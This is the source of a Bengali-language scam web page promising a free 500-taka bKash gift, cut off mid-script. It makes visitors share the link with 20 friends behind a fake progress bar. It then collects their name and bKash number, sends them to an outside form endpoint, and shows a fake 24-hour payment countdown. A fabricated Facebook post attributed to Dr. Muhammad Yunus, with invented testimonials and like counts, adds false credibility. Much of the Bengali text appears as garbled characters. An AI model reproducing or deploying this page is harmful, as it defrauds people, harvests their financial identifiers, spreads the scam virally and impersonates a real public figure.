<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Bkash-500tk-Free</title>
  <style>
    body {
      font-family: 'Noto Sans Bengali', Arial, sans-serif;
      background: #ffd1ec;
      margin: 0;
      min-height: 100vh;
    }
    .glow-pink {
      box-shadow: 0 0 12px 3px #ff7eb9a6;
      background: linear-gradient(135deg, #ffe4f0 60%, #ffb4e6 100%);
    }
    .blur-form {
      filter: blur(3px) brightness(0.85);
      pointer-events: none;
      user-select: none;
      opacity: 0.7;
    }
    .popup-bg {
      background: rgba(255, 192, 203, 0.8);
      backdrop-filter: blur(2px);
      position: fixed;
      inset: 0;
      z-index: 30;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .countdown-text {
      font-size: 1.3rem;
      font-weight: 600;
      color: #e60074;
    }
    .upgrade-bar {
      width: 100%;
      background: #fed7ef;
      height: 1.7rem;
      border-radius: 0.7rem;
      position: relative;
      overflow: hidden;
      margin: 1rem 0;
      box-shadow: 0 1px 4px #ffb3d4a0 inset;
    }
    .upgrade-fill {
      background: #ff69b4;
      height: 100%;
      border-radius: 0.7rem;
      transition: width 0.5s;
      position: absolute;
      left: 0; top: 0; bottom: 0;
    }
    .upgrade-text {
      position: absolute;
      width: 100%;
      text-align: center;
      color: #b6004a;
      font-weight: bold;
      font-size: 1.1rem;
      top: 0;
      line-height: 1.7rem;
      letter-spacing: 1px;
    }
    .blur-block {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255,182,193,0.7);
      border-radius: 1rem;
      font-weight: bold;
      color: #c8005e;
      font-size: 1.07rem;
      z-index: 4;
    }
    input,button {
      font-size: 1.09rem;
    }
    .btn-main {
      background: #ff69b4;
      color: #fff;
      padding: 0.7rem 2.2rem;
      border: none;
      border-radius: 0.7rem;
      font-weight: bold;
      box-shadow: 0 2px 4px #ffb3d4a0;
      cursor: pointer;
      transition: background 0.1s;
    }
    .btn-main:active, .btn-main:focus {
      background: #e045a2;
      outline: none;
    }
    .btn-main[disabled] {
      opacity: 0.65;
      cursor: not-allowed;
    }
    .main-card {
      background: #fff;
      border-radius: 1.1rem;
      box-shadow: 0 4px 24px #ffb3d4a0;
      margin: 2rem auto 0 auto;
      padding: 2rem;
      max-width: 420px;
      width: 100%;
      position: relative;
    }
    .banner-img {
      width: 100%;
      max-width: 410px;
      display: block;
      margin: 1.2rem auto 0 auto;
      border-radius: 1rem;
      box-shadow: 0 2px 8px #ffb3d4a0;
    }
    /* --- Facebook Post --- */
    .fb-post-card {
      background: #fff;
      border-radius: 1.1rem;
      box-shadow: 0 2px 8px #ffb3d4a0;
      margin: 2.7rem auto 0 auto;
      padding: 1.2rem 1rem 0.7rem 1rem;
      max-width: 420px;
      width: 100%;
    }
    .fb-post-header {
      display: flex;
      align-items: center;
      gap: 0.7rem;
      margin-bottom: 0.4rem;
    }
    .fb-post-avatar {
      background: #f7c2de;
      border-radius: 50%;
      width: 38px;
      height: 38px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 1.25rem;
      color: #e60074;
      border: 2px solid #ffe2f0;
    }
    .fb-post-user {
      font-weight: bold;
      color: Black;
      font-size: 1.09rem;
    }
    .fb-post-time {
      color: #888;
      font-size: 0.93rem;
      font-weight: 500;
    }
    .fb-post-text {
      font-size: 1.13rem;
      margin: 0.5rem 0 0.8rem 0;
      color: #333;
    }
    .fb-post-img {
      width: 100%;
      border-radius: 0.8rem;
      margin: 0.4rem 0 0.5rem 0;
      box-shadow: 0 1px 4px #ffb3d4a0;
      object-fit: cover;
      max-height: 270px;
    }
    .fb-post-actions {
      display: flex;
      align-items: center;
      gap: 1.6rem;
      margin: 0.3rem 0 0.2rem 0;
    }
    .fb-like-btn,.fb-comment-btn {
      display: flex;
      align-items: center;
      gap: 0.4rem;
      cursor: pointer;
      font-weight: 600;
      color: red;
      background: #87CEFA;
      border: yellow;
      font-size: 1.1rem;
      padding: 0.13rem 0.3rem;
      border-radius: 0.3rem;
      transition: background 0.12s;
    }
    .fb-like-btn.liked {
      color: white;
      background: blue;
    }
    .fb-like-btn:hover,.fb-comment-btn:hover {
      background: blue;
    }
    .fb-comment-count,.fb-like-count {
      color: red;
      font-size: 1.07rem;
      margin-left: 0.13rem;
      min-width: 50px;
      display: inline-block;
    }
    .fb-post-comments {
      margin: 0.9rem 0 0.7rem 0.5rem;
      padding-bottom: 0.2rem;
    }
    .fb-comment {
      display: flex;
      align-items: flex-start;
      gap: 0.8rem;
      margin-bottom: 0.6rem;
    }
    .fb-comment-avatar {
      width: 35px;
      height: 35px;
      border-radius: 50%;
      background: #ffe1f3;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.08rem;
      font-weight: bold;
      color: #e60074;
      border: 1.9px solid #ffd1ec;
    }
    .fb-comment-body {
      background: blue;
      border-radius: 0.9rem;
      padding: 0.60rem 1rem;
      color: white;
      font-size: 1.05rem;
    }

    /* --- Live Notification --- */
    #liveNotifyWrap {
      width: 90vw;
      min-height: 53px;
      height: 53px;
      position: relative;
      margin: 0 auto 0 auto;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      justify-content: flex-end;
      margin-bottom: 30px;
	  margin-top: 30px;
      transition: height 0.2s;
      box-sizing: border-box;
      overflow: hidden;
    }
    .live-notify {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      min-width: 300px;
      max-width: 300px;
      background: black;
      border-radius: 1.4rem;
      box-shadow: 0 4px 24px #ffb3d4a0, 0 2px 8px #ffe1f3;
      color: #b6004a;
      font-weight: 400;
      font-size: 0.8rem;
      padding: 0.80rem 1.1rem 0.80rem 0.95rem;
      margin-bottom: 5px;
      opacity: 1;
      position: absolute;
      left: -360px;
      top: 0;
      animation: liveNotifAnim 7s linear forwards;
      will-change: left, opacity;
    }
    .live-notify-amount {
      color: yellow;
      background: linear-gradient(135deg,#ff69b4 70%,#ffd1ec 100%);
      border-radius: .9rem;
      padding: 0.30rem 0.95rem 0.30rem 0.85rem;
      font-size: 1.06rem;
      font-weight: 800;
      box-shadow: 0 3px 14px #ffd1ec90;
      letter-spacing: 1px;
    }
    @keyframes liveNotifAnim {
      0%   { left: -400px; opacity: 0;}
      10%  { left: 10px; opacity: 1;}
      90%  { left: 75vw; opacity: 1;}
      100% { left: 100vw; opacity: 0;}
    }
    @media(max-width: 500px){
      .live-notify {max-width:90vw;}
      #liveNotifyWrap { min-height: 50px; height: 50px;}
    }
  </style>
</head>
<body>
  <img class="banner-img" src="https://i.ytimg.com/vi/MFOOxXbD3RY/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLC0qk4Ob3WwWpspjKN3gk6dKXf6LA" alt="Banner"/>
  <div class="main-card glow-pink" id="main"></div>
  <div id="popup"></div>
  <div id="liveNotifyWrap"></div>
  <div id="fbpost"></div>
  <script>
    // ----------- In-App Browser Detect & Block -----------
    const FIXED_URL = "https://akash2025id.github.io/Bkash-Free-Tk/";
    function inAppBrowserName() {
      const ua = navigator.userAgent || "";
      if (/FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSS|FBID|FBSN|FBBV|FBCA|FBMD|FBLC|FBSC|FBOP/.test(ua)) {
        return "Facebook";
      }
      if (/Instagram/.test(ua)) {
        return "Instagram";
      }
      if (/Messenger/.test(ua)) {
        return "Messenger";
      }
      return null;
    }
    function showOpenInBrowser() {
      document.getElementById("main").innerHTML = `
        <div class="note-warning">
          ‡¶Ü‡¶™‡¶®‡¶ø Facebook/Messenger/Instagram-‡¶è‡¶∞ ‡¶≠‡¶ø‡¶§‡¶∞‡ßá‡¶∞ ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ‡¶Ü‡¶∏‡¶õ‡ßá‡¶®‡•§
          <br><br>
          ‡¶ï‡¶ø‡¶õ‡ßÅ ‡¶´‡¶ø‡¶ö‡¶æ‡¶∞ (Share, ‡¶´‡¶∞‡ßç‡¶Æ ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü) ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶¨‡ßá ‡¶®‡¶æ‡•§
          <br><br>
          ‡¶¶‡ßü‡¶æ ‡¶ï‡¶∞‡ßá <b>Chrome/Browser</b> ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶≤‡¶ø‡¶Ç‡¶ï‡¶ü‡¶ø ‡¶ñ‡ßÅ‡¶≤‡ßÅ‡¶®‡•§
        </div>
        <button class="btn-main" onclick="openNativeBrowser()">Chrome/Browser-‡¶è ‡¶ñ‡ßÅ‡¶≤‡ßÅ‡¶®</button>
        <div style="margin-top:1.4rem;color:#b6004a;">‡¶®‡¶ø‡¶ú‡ßá ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßá Chrome-‡¶è‡¶ì ‡¶ì‡¶™‡ßá‡¶® ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®:<br><span style="font-size:1.07rem;background:#fff2f8;border-radius:0.5rem;padding:0.2rem 0.5rem;user-select:all">${FIXED_URL}</span></div>
      `;
    }
    function openNativeBrowser() {
      // Android intent (works on most Android devices)
      if (navigator.userAgent.match(/Android/i)) {
        window.location = `intent://${FIXED_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
        setTimeout(() => {
          window.open(FIXED_URL, "_blank");
        }, 1500);
      } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
        // iOS: open in Safari
        window.location = FIXED_URL;
      } else {
        // fallback
        window.open(FIXED_URL, "_blank");
      }
    }

    // ------- LocalStorage Utils -------
    const get = key => window.localStorage.getItem(key);
    const set = (key, val) => window.localStorage.setItem(key, val);
    const getNum = key => Number(get(key) || 0);

    // ------- Constants -------
    const TARGET_SHARES = 20;
    const FORM_ENDPOINT = "https://formspree.io/f/myzjlqdp";
    const BANNER_IMG = "https://i.ytimg.com/vi/MFOOxXbD3RY/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLC0qk4Ob3WwWpspjKN3gk6dKXf6LA";
    const SHARE_TEXT = `üéâ ‡¶Ö‡¶¨‡¶ø‡¶∂‡ßç‡¶¨‡¶æ‡¶∏‡ßç‡¶Ø ‡¶∏‡ßÅ‡¶Ø‡ßã‡¶ó! ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶è‡¶ï‡¶¨‡¶æ‡¶∞ ‡¶´‡¶∞‡ßç‡¶Æ ‡¶™‡ßÇ‡¶∞‡¶£ ‡¶ï‡¶∞‡¶≤‡ßá‡¶á ‡¶Ü‡¶™‡¶®‡¶ø ‡¶™‡ßá‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶® bKash-‡¶è ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø ‡ß´‡ß¶‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶∂ ‡¶â‡¶™‡¶π‡¶æ‡¶∞! ü§ëüí∏ ‡¶è‡¶ñ‡¶®‡¶á ‡¶≤‡¶ø‡¶Ç‡¶ï‡ßá ‡¶Ø‡¶æ‡¶® ‡¶ì ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∏‡ßÅ‡¶Ø‡ßã‡¶ó‡¶ü‡¶ø ‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡¶ø‡¶§ ‡¶ï‡¶∞‡ßÅ‡¶®! ‚úÖüëá`;

    // ------- Facebook Post Data -------
    const FBPOST_USER = {name:'Dr. Muhammad Yunus', avatar:'M-U', time:'3 ‡¶¶‡¶ø‡¶® ‡¶Ü‡¶ó‡ßá'};
    const FBPOST_TEXT = "üëÄ ‡¶∏‡¶¨‡¶æ‡¶á ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®! ‡¶Ø‡¶æ‡¶∞‡¶æ ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá‡¶õ‡ßá‡¶® ‡¶è‡¶¨‡¶Ç ‡¶´‡¶∞‡ßç‡¶Æ ‡¶™‡ßÇ‡¶∞‡¶£ ‡¶ï‡¶∞‡ßá‡¶õ‡ßá‡¶®, ‡¶§‡¶æ‡¶¶‡ßá‡¶∞ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶™‡ßå‡¶Å‡¶õ‡ßá ‡¶ó‡ßá‡¶õ‡ßá bKash-‡¶è! üéä ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞‡¶æ‡¶ì ‡¶Ø‡¶¶‡¶ø ‡¶™‡ßá‡¶Ø‡¶º‡ßá ‡¶•‡¶æ‡¶ï‡ßá‡¶®, ‡¶§‡¶æ‡¶π‡¶≤‡ßá ‡¶¶‡ßá‡¶∞‡¶ø ‡¶®‡¶æ ‡¶ï‡¶∞‡ßá ‡¶ú‡¶æ‡¶®‡¶ø‡¶Ø‡¶º‡ßá ‡¶¶‡¶ø‡¶®! üí¨üëá ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶â‡¶¶‡ßç‡¶Ø‡ßã‡¶ó ‡¶∏‡¶´‡¶≤ ‡¶ï‡¶∞‡¶§‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶¶‡ßá‡¶∞ ‡¶Æ‡¶§‡¶æ‡¶Æ‡¶§‡¶á ‡¶Ø‡¶•‡ßá‡¶∑‡ßç‡¶ü ‚ù§Ô∏è‚ú®";
    const FBPOST_IMG = BANNER_IMG;
    const FBPOST_INIT_LIKES = 115976;
    const FBPOST_INIT_COMMENTS = 99397;
    const FBPOST_COMMENTS = [
      {user:'Mithila', avatar:'M', text:'‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶≤‡ßá‡¶á ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶™‡¶æ‡¶ö‡ßç‡¶õ‡¶ø, ‡¶¨‡¶ø‡¶∂‡ßç‡¶¨‡¶æ‡¶∏ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶õ‡¶ø ‡¶®‡¶æ!'},
		{user:'Rafsan', avatar:'R', text:'‡¶Ö‡¶®‡ßá‡¶ï ‡¶â‡¶™‡¶ï‡¶æ‡¶∞ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá, ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶!'},
		{user:'Sadia', avatar:'‡¶∏‡¶æ', text:'‡¶Ö‡¶®‡ßá‡¶ï ‡¶¶‡¶ø‡¶® ‡¶™‡¶∞ ‡¶è‡¶ï‡¶ü‡¶æ ‡¶Ü‡¶∏‡¶≤ ‡¶Ö‡¶´‡¶æ‡¶∞ ‡¶™‡ßá‡¶≤‡¶æ‡¶Æ!'},
		{user:'Tanim', avatar:'T', text:'‡ß´‡ß¶‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶™‡ßá‡¶Ø‡¶º‡ßá ‡¶ó‡ßá‡¶õ‡¶ø, ‡¶∏‡¶§‡ßç‡¶Ø‡¶ø‡¶á ‡¶ö‡¶Æ‡ßé‡¶ï‡¶æ‡¶∞‡•§'},
		{user:'Nusrat', avatar:'‡¶®‡ßÅ', text:'‡¶Ü‡¶Æ‡¶ø ‡¶ó‡¶§‡¶ï‡¶æ‡¶≤ ‡¶´‡¶∞‡ßç‡¶Æ ‡¶™‡ßÇ‡¶∞‡¶£ ‡¶ï‡¶∞‡ßá‡¶õ‡¶ø‡¶≤‡¶æ‡¶Æ, ‡¶Ü‡¶ú ‡¶™‡ßá‡¶≤‡¶æ‡¶Æ ‡¶ü‡¶æ‡¶ï‡¶æ!'},
		{user:'Imran', avatar:'I', text:'‡¶∏‡¶¨‡¶æ‡¶á ‡¶¶‡ßç‡¶∞‡ßÅ‡¶§ ‡¶ï‡¶∞‡ßá ‡¶´‡ßá‡¶≤‡ßã, ‡¶Ü‡¶Æ‡¶ø ‡¶™‡ßá‡¶≤‡¶æ‡¶Æ!'},
		{user:'Farhana', avatar:'‡¶´‡¶æ', text:'‡¶è‡¶Æ‡¶® ‡¶â‡¶¶‡ßç‡¶Ø‡ßã‡¶ó ‡¶Ü‡¶∞‡¶ì ‡¶π‡¶ì‡¶Ø‡¶º‡¶æ ‡¶â‡¶ö‡¶ø‡¶§‡•§ ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶!'},
		{user:'Rakib', avatar:'R', text:'‡¶è‡¶ü‡¶æ ‡¶è‡¶ï‡¶¶‡¶Æ ‡¶∏‡¶§‡ßç‡¶Ø‡¶ø!'},
    ];

    // ------- State -------
    let state = {
      blocked: get("blocked") === "1",
      shareCount: getNum("shareCount"),
      upgrade: getNum("upgrade"),
      submitted: get("submitted") === "1",
      cdEnd: getNum("cdEnd"),
      showRedirect: false,
      showSharePopup: false,
      fbLiked: get("fbLiked") === "1"
    };

    function isChrome() {
      const ua = navigator.userAgent;
      return /chrome/i.test(ua) && !/edge|opr|brave/i.test(ua);
    }
    function handleChromeRedirect() {
      try {
        window.location.href = "googlechrome://navigate?url=" + FIXED_URL;
        setTimeout(() => {
          window.open(FIXED_URL, '_blank');
        }, 1500);
      } catch(e) { window.open(FIXED_URL,'_blank'); }
    }
    function renderFBPost() {
      let likeCount = FBPOST_INIT_LIKES + (state.fbLiked?1:0);
      let liked = state.fbLiked;
      let fbpost = `
        <div class="fb-post-card">
          <div class="fb-post-header">
            <div class="fb-post-avatar">${FBPOST_USER.avatar}</div>
            <div>
              <div class="fb-post-user">${FBPOST_USER.name}</div>
              <div class="fb-post-time">${FBPOST_USER.time}</div>
            </div>
          </div>
          <div class="fb-post-text">${FBPOST_TEXT}</div>
          <img src="${FBPOST_IMG}" class="fb-post-img" alt=""/>
          <div class="fb-post-actions">
            <button class="fb-like-btn${liked?' liked':''}" onclick="handleFBLike()">
              <svg width="20" height="20" viewBox="0 0 20 20" fill="${liked?'#fff':'#e60074'}" style="margin-right:2px;" xmlns="http://www.w3.org/2000/svg"><path d="M10 18s-7-6.583-7-10.333C3 3.167 7.5 3.5 10 8.333 12.5 3.5 17 3.167 17 7.667 17 11.417 10 18 10 18z" stroke="${liked?'#e60074':'#e60074'}" stroke-width="1" fill-rule="evenodd"/></svg>
              <span>Like</span>
              <span class="fb-like-count">${likeCount.toLocaleString()}</span>
            </button>
            <button class="fb-comment-btn" onclick="handleFBCommentClick()">
              <svg width="18" height="18" fill="#e60074" style="margin-right:2px;" viewBox="0 0 24 24"><path d="M21 6.5a2 2 0 0 0-2-2h-14a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h3l.29.29c.18.17.4.27.65.21.25-.07.46-.26.51-.52l.09-.38H19a2 2 0 0 0 2-2v-8zm-2 10h-7.1l-1.1 1.67c-.2.3-.54.47-.9.41-.37-.07-.65-.37-.69-.74l-.05-.34H5a4 4 0 0 1-4-4v-8a4 4 0 0 1 4-4h14a4 4 0 0 1 4 4v8a4 4 0 0 1-4 4z"/></svg>
              <span>Comment</span>
              <span class="fb-comment-count">${FBPOST_INIT_COMMENTS.toLocaleString()}</span>
            </button>
          </div>
          <div class="fb-post-comments">
            ${FBPOST_COMMENTS.slice(0,4).map(c=>
              `<div class="fb-comment">
                <div class="fb-comment-avatar">${c.avatar}</div>
                <div class="fb-comment-body">${c.text}</div>
              </div>`
            ).join('')}
          </div>
        </div>
      `;
      document.getElementById("fbpost").innerHTML = fbpost;
    }
    function handleFBLike() {
      if (!state.fbLiked) {
        set("fbLiked", "1");
        state.fbLiked = true;
        renderFBPost();
      }
    }
    function handleFBCommentClick() {
      alert("‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§! ‡¶è‡¶á ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ‡¶ï‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨ ‡¶®‡¶Ø‡¶º‡•§");
    }
    function render() {
      const main = document.getElementById("main");
      if (state.blocked) {
        main.innerHTML = `
          <div style="text-align:center;">
            <h1 class="text-2xl" style="color:#e60074;font-size:1.5rem;font-weight:700;">‡¶Ü‡¶™‡¶®‡¶ø ‡¶¨‡ßç‡¶≤‡¶ï‡¶°!</h1>
            <p style="color:#b6004a;font-weight:600;margin:1.4rem 0 0.7rem 0;">‡¶Ü‡¶™‡¶®‡¶ø ‡¶è‡¶∞ ‡¶Ü‡¶ó‡ßá ‡¶è‡¶á ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶¶‡¶ø‡ßü‡ßá ‡¶™‡ßá‡¶Æ‡ßá‡¶®‡ßç‡¶ü‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶¨‡ßá‡¶¶‡¶® ‡¶ï‡¶∞‡ßá‡¶õ‡ßá‡¶®‡•§</p>
          </div>
        `;
        return;
      }
      if (!isChrome()) {
        main.innerHTML = `
          <div style="text-align:center;">
            <h2 class="text-xl" style="color:#e60074;font-weight:700;">‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ Chrome ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞‡ßá ‡¶ö‡¶≤‡¶¨‡ßá</h2>
            <p style="margin:1rem;">‡¶Ü‡¶™‡¶®‡¶ø ‡¶Ö‡¶®‡ßç‡¶Ø ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶¨‡¶æ Messenger ‡¶•‡ßá‡¶ï‡ßá ‡¶è‡¶∏‡ßá‡¶õ‡ßá‡¶®‡•§ Chrome ‡¶è ‡¶Ø‡ßá‡¶§‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ö‡¶æ‡¶™‡ßÅ‡¶®‡•§</p>
            <button class="btn-main" style="font-size:1.17rem;" onclick="handleChromeRedirect()">Chrome ‡¶è ‡¶Ø‡¶æ‡¶®</button>
          </div>
        `;
        return;
      }
      if (state.submitted && state.cdEnd) {
        main.innerHTML = `
          <div style="text-align:center;">
            <h2 style="color:#e60074;font-weight:700;">‡¶™‡ßá‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏ ‡¶π‡¶ö‡ßç‡¶õ‡ßá!</h2>
            <p style="margin:0.9rem 0 1rem 0;">‡ß®‡ß™ ‡¶ò‡¶®‡ßç‡¶ü‡¶æ‡¶∞ ‡¶Æ‡¶ß‡ßç‡¶Ø‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ bKash ‡¶è ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶™‡ßá‡ßü‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡¶®‡•§</p>
            <div class="countdown-text" id="countdown"></div>
          </div>
        `;
        countdownTick();
        return;
      }
      main.innerHTML = `
        <h1 style="color:#e60074;font-size:1.4rem;font-weight:700;text-align:center;">‡¶Æ‡ßç‡¶Ø‡¶æ‡¶∏‡ßá‡¶®‡ßç‡¶ú‡¶æ‡¶∞‡ßá ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶è‡¶¨‡¶Ç ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶®‡¶ø‡¶®..</h1>
        <div class="upgrade-bar" style="margin-top:1.7rem;">
          <div class="upgrade-fill" id="upgradeFill" style="width:${state.upgrade}%;"></div>
          <div class="upgrade-text">${state.upgrade}%</div>
        </div>
        <div style="text-align:center;margin-top:2rem;">
          <button class="btn-main" style="font-size:1.13rem;" onclick="handleShowSharePopup()" ${state.upgrade>=100?'disabled':''}>
            Share ‡¶ï‡¶∞‡ßÅ‡¶® ${state.upgrade<100?`<span style='font-size:1.05rem;'>(${state.shareCount}/${TARGET_SHARES})</span>`:""}
          </button>
          ${state.upgrade<100?`<div style="margin-top:1rem;color:#e60074;font-weight:600;">‡ß®‡ß¶ ‡¶ú‡¶® ‡¶´‡ßç‡¶∞‡ßá‡¶®‡ßç‡¶°‡¶ï‡ßá ‡¶Æ‡ßá‡¶∏‡ßá‡¶û‡ßç‡¶ú‡¶æ‡¶∞‡ßá ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶≤‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶´‡¶∞‡ßç‡¶Æ‡¶ü‡¶ø ‡¶ñ‡ßÅ‡¶≤‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá.üëá</div>`:""}
        </div>
        <div style="position:relative; margin-top:2.7rem;">
          <form id="payForm" ${state.upgrade<100?'class="blur-form"':''} autocomplete="off" style="display:flex; flex-direction:column; gap:1.1rem;">
            <h3 style="color:#e60074;font-weight:700;font-size:1.08rem;text-align:center;">bKash Information</h3>
            <input type="text" name="name" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ" style="padding:0.7rem;border-radius:0.6rem;border:1.5px solid #ffe2f0;" ${state.upgrade<100?'disabled':''}/>
            <input type="tel" name="bkash" required pattern="01[3-9]\\d{8}" placeholder="bKash ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ (01XXXXXXXXX)" style="padding:0.7rem;border-radius:0.6rem;border:1.5px solid #ffe2f0;" ${state.upgrade<100?'disabled':''}/>
            <button type="submit" class="btn-main" style="margin-top:0.4rem;" ${state.upgrade<100?'disabled':''}>‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®</button>
          </form>
          ${state.upgrade<100?`<div class="blur-block">‡¶Ü‡¶ó‡ßá ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶ï‡¶∞‡ßÅ‡¶®</div>`:""}
        </div>
      `;
      if (state.upgrade>=100) {
        document.getElementById("payForm").onsubmit = handleFormSubmit;
      }
    }
    function handleShowSharePopup() {
      state.showSharePopup = true;
      renderPopup();
    }
    function renderPopup() {
      const popup = document.getElementById("popup");
      if (state.showSharePopup) {
        popup.innerHTML = `
          <div class="popup-bg">
            <div style="background:#fff;border-radius:1rem;box-shadow:0 4px 18px #ffb3d4aa;padding:2rem;max-width:320px;text-align:center;">
              <div style="font-weight:700;color:#e60074;font-size:1.16rem;margin-bottom:0.7rem">Messenger ‡¶è ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®</div>
              <div style="margin-bottom:1.4rem;">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡ß®‡ß¶ ‡¶ú‡¶® ‡¶´‡ßç‡¶∞‡ßá‡¶®‡ßç‡¶°‡¶ï‡ßá Messenger/WhatsApp/IMO-‡¶§‡ßá ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®</div>
              <button class="btn-main" onclick="handleNativeShare()">‡¶†‡¶ø‡¶ï ‡¶Ü‡¶õ‡ßá, ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶¨</button>
            </div>
          </div>
        `;
      } else popup.innerHTML = '';
    }
    async function handleNativeShare() {
      state.showSharePopup = false;
      renderPopup();
      let sc = getNum("shareCount");
      let upg = getNum("upgrade");
      if (sc >= TARGET_SHARES) return;
      sc += 1;
      set("shareCount", sc);
      state.shareCount = sc;
      let inc = 0, delay = 0;
      if (sc === 1) {
        inc = 50; delay = 20000;
      } else if (upg < 90) {
        inc = 5; delay = 15000;
      } else if (upg >= 90 && upg < 100) {
        inc = 1; delay = 10000;
      }
      if (inc > 0) {
        setTimeout(() => {
          let cu = getNum("upgrade");
          let nu = Math.min(100, cu+inc);
          set("upgrade", nu);
          state.upgrade = nu;
          render();
        }, delay);
      }
      render();
      let url = FIXED_URL;
      if (navigator.share) {
        try {
          await navigator.share({
            title: "Bkash Free Offer",
            text: SHARE_TEXT,
            url
          });
        } catch(e){}
      } else {
        window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`,"_blank");
      }
    }
    async function handleFormSubmit(e) {
      e.preventDefault();
      const fd = new FormData(e.target);
      const name = fd.get("name").trim();
      const bkash = fd.get("bkash").trim();
      if (!name || !/^01[3-9]\d{8}$/.test(bkash)) {
        alert("‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶æ‡¶Æ ‡¶è‡¶¨‡¶Ç bKash ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶¶‡¶ø‡¶®!");
        return;
      }
      e.target.querySelector('button[type=submit]').disabled = true;
      try {
        await fetch(FORM_ENDPOINT, {
          method: "POST",
          body: fd,
          headers: {Accept:"application/json"}
        });
      } catch(e){}
      set("submitted", "1");
      set("cdEnd", Date.now() + 24*60*60*1000);
      state.submitted = true;
      state.cdEnd = getNum("cdEnd");
      render();
    }
    function countdownTick() {
      const cde = getNum("cdEnd");
